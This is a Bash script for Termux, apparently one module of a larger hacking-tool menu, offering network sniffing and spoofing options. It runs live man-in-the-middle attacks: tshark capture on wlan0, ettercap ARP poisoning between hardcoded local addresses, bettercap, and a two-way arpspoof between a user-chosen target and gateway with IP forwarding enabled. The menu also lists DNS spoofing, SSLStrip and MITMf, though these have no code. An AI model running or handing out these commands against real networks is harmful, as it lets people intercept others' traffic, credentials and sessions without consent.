#!/data/data/com.termux/files/usr/bin/bash
# Filename: sniffing_spoofing.sh

sniffing_spoofing() {
    clear
    echo -e "${YELLOW}"
    cat << "EOF"
┌─┐┌┐┌┌─┐┌─┐┌─┐  ┌─┐┌─┐ ┬ ┬┬┌┐┌┌─┐┌─┐┌─┐
├┤ │││├─┘├─┤└─┐  └─┐├─┘ └┬┘│││││ ┬├┤ └─┐
└─┘┘└┘┴  ┴ ┴└─┘  └─┘┴    ┴ ┴┘└┘└─┘└─┘└─┘
EOF
    echo -e "${RESET}"
    
    echo -e "${GREEN}[1]${NC}  Wireshark/Tshark"
    echo -e "${GREEN}[2]${NC}  Ettercap"
    echo -e "${GREEN}[3]${NC}  Bettercap"
    echo -e "${GREEN}[4]${NC}  ARP Spoofing"
    echo -e "${GREEN}[5]${NC}  DNS Spoofing"
    echo -e "${GREEN}[6]${NC}  SSLStrip"
    echo -e "${GREEN}[7]${NC}  MITMf"
    echo -e "${GREEN}[8]${NC}  GoBack"
    
    read -p "Select tool: " tool
    
    case $tool in
        1)
            echo -e "${YELLOW}[*] Packet Capture${RESET}"
            tshark -i wlan0 -c 100 -w capture.pcap
            echo "Analyzing packets..."
            tshark -r capture.pcap
            ;;
        2)
            echo -e "${YELLOW}[*] Ettercap - MITM${RESET}"
            echo "Starting ARP poisoning..."
            ettercap -T -i wlan0 -M arp /192.168.1.1// /192.168.1.100//
            ;;
        3)
            echo -e "${YELLOW}[*] Bettercap${RESET}"
            pkg install bettercap -y
            bettercap -iface wlan0
            ;;
        4)
            echo -e "${YELLOW}[*] ARP Spoofing Script${RESET}"
            read -p "Target IP: " target
            read -p "Gateway IP: " gateway
            echo "Enabling IP forwarding..."
            echo 1 > /proc/sys/net/ipv4/ip_forward
            echo "Starting ARP spoof..."
            arpspoof -i wlan0 -t $target $gateway &
            arpspoof -i wlan0 -t $gateway $target &
            echo "ARP spoofing running. Press Ctrl+C to stop."
            wait
            ;;
        8) return ;;
        *) echo "Invalid option" ;;
    esac
}
